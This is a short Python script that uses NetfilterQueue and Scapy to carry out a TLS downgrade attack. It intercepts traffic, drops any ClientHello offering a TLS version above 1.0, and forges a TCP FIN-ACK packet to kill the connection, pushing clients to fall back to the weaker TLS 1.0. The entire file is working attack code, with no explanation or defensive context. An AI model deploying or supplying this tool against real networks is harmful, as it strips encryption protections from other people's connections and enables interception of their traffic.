#!/usr/bin/env python3

from netfilterqueue import NetfilterQueue
from scapy.all import *

def callback(pkt):
    shouldDrop = False
    
    ip = IP(pkt.get_payload())
    if ip.haslayer(Raw):
        data_bytes = ip[Raw].load
        # First, detect the client hello message
        if data_bytes[0] == 0x16 and data_bytes[5] == 0x01:
            # Secondly, drop clientHello if TLS version is higher than 1.0
            if data_bytes[9] == 0x03 and data_bytes[10] > 0x01:
                shouldDrop = True
                # Finally, terminate the current connection
                new_packet = IP(dst=ip[IP].dst, src=ip[IP].src)/TCP()
                new_packet[TCP].sport = ip[TCP].sport
                new_packet[TCP].dport = ip[TCP].dport
                new_packet[TCP].seq = ip[TCP].seq
                new_packet[TCP].ack = ip[TCP].ack
                new_packet[TCP].flags = 'FA'
                send(new_packet)

    if shouldDrop:
        pkt.drop()
    else:
        pkt.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(0, callback, 100)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()
